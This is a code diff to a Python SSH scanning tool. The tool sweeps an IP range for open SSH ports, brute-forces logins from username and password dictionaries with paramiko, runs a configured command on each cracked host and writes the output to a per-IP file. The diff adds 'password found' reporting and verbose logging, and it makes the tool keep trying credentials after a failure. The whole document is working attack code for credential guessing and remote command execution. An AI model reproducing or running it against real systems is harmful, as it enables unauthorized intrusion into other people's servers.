@@ -10,6 +10,9 @@ from socket import *
 
 import time
 from threading import Thread
+green_text = "\033[32m"
+reset_text = "\033[0m"
+
 
 ssh_scan = None
 def signal_handler(sig, frame):
@@ -53,6 +56,10 @@ class SSHScan():
         self.timeout = timeout 
         self.forced_exit = False
         self.thread_list = {}
+    
+
+    def _remove_ip(self, ip):
+        del self.thread_list[ip]
 
     def _loadDictionary(self):
         ff = open(self.user_ssh_file, 'r')
@@ -100,6 +107,8 @@ class SSHScan():
                 time.sleep(2)
             else:
                 ip = self.start_ip
+                if self.verbose:
+                    print("Scanning ip {}".format(ip))
                 t = Thread(target=self._scan_ip, args=(ip,))
                 t.start()
                 self.thread_list[ip] = t
@@ -109,6 +118,7 @@ class SSHScan():
 
         while len(self.thread_list)>0:
             time.sleep(3)
+        
         print("Done!")
 
     def _scan_ip(self, ip):
@@ -123,12 +133,12 @@ class SSHScan():
             connSkt = socket(AF_INET, SOCK_STREAM)
             connSkt.settimeout(self.timeout)
             connSkt.connect((ip, self.ssh_port))
-            print("[+] {}:{} open".format(ip,self.ssh_port))
+            print("[*] {}:{} open".format(ip,self.ssh_port))
         
         except:
             connSkt.close()
             try:
-                del self.thread_list[ip]
+                self._remove_ip(ip)
             except:
                 pass
             return
@@ -138,44 +148,46 @@ class SSHScan():
     
 
         for user in self.user_list:
+
             if self.forced_exit:
                 return
             user = user.strip("\n")
             for psw in self.pass_list:
+
                 if self.forced_exit:
                     return
                 psw=psw.strip("\n")
-
                 try:
-                    print("Cracking SSH account ({}/{})...".format(user,psw))
+                    if self.verbose:
+                        print("Cracking SSH account ({}/{})...".format(user,psw))
                     ssh.connect(ip, self.ssh_port, user, psw,timeout=self.timeout)
-                    print("Sending command: {}".format(self.ssh_linux_shellcode)) 
-                    stdin, stdout, stderr = ssh.exec_command(self.ssh_linux_shellcode)
+                    print(green_text+"[*] Password found ({}/{})...".format(user,psw)+reset_text)
 
+                    if self.ssh_linux_shellcode is not None:
+                        print("Sending command: {}".format(self.ssh_linux_shellcode)) 
+                        stdin, stdout, stderr = ssh.exec_command(self.ssh_linux_shellcode)
+                        output=stdout.readlines()
+                        
+                        print("\n--- RESPONSE ---")
+                        print("\n".join(output))
+                        print("-------------")
+
+                        ssh.close()
+                        
+                        ww = open(ip+".txt",'w')
+                        for line in output:
+                            ww.write(line)
+                        ww.close()
                     
-                    output=stdout.readlines()
-                    print(output)
-
-                    print("Close connection") 
-                    ssh.close()
-                    
-                    ww = open(ip+".txt",'w')
-                    for line in output:
-                        ww.write(line)
-                    ww.close()
-
-
-                    del self.thread_list[ip]
-                    return
                 except (paramiko.ssh_exception.AuthenticationException, paramiko.ssh_exception.SSHException):
                     ssh.close()
-                    break
+                    ###### remove ip if FIRST CRACKED option is enabled
+                    continue
                 except:
-                    #print("Skip {}".format(ip))
-
-                    del self.thread_list[ip]
+                    self._remove_ip(ip)
                     return
-        del self.thread_list[ip]
+        self._remove_ip(ip)
+
         
 
 def scan(start_ip,
